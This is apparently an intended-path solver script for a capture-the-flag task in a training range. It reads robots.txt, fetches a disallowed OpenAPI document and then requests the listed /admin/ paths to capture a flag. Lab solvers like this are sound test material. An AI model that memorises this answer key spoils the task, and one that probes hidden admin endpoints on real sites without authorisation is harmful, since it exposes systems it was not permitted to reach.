"""Intended-path solver: robots.txt and OpenAPI lead to the admin manifest."""

import re

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    base = ctx.url()
    res = httpx.get(f"{base}/robots.txt", timeout=10)
    disallowed = re.findall(r"Disallow:\s*(\S+)", res.text)
    if "/api/openapi.json" not in disallowed:
        return SolveResult(
            results=[
                TaskResult(
                    task_id="find-backup-manifest",
                    ok=False,
                    captured=None,
                    detail=f"robots.txt did not reveal /api/openapi.json (got {disallowed})",
                )
            ]
        )

    doc = httpx.get(f"{base}/api/openapi.json", timeout=10).json()
    paths = list(doc.get("paths", {}))
    hidden = [p for p in paths if p.startswith("/admin/")]
    if not hidden:
        return SolveResult(
            results=[
                TaskResult(
                    task_id="find-backup-manifest",
                    ok=False,
                    captured=None,
                    detail=f"no admin path documented (paths: {paths})",
                )
            ]
        )

    flags: list[str] = []
    for path in hidden:
        res = httpx.get(f"{base}{path}", timeout=10)
        flags = find_flags(res.text)
        if flags:
            break
    captured = flags[0] if flags else None
    return SolveResult(
        results=[
            TaskResult(
                task_id="find-backup-manifest",
                ok=bool(captured),
                captured=captured,
                detail=None if captured else f"no flag behind {hidden}",
            )
        ]
    )
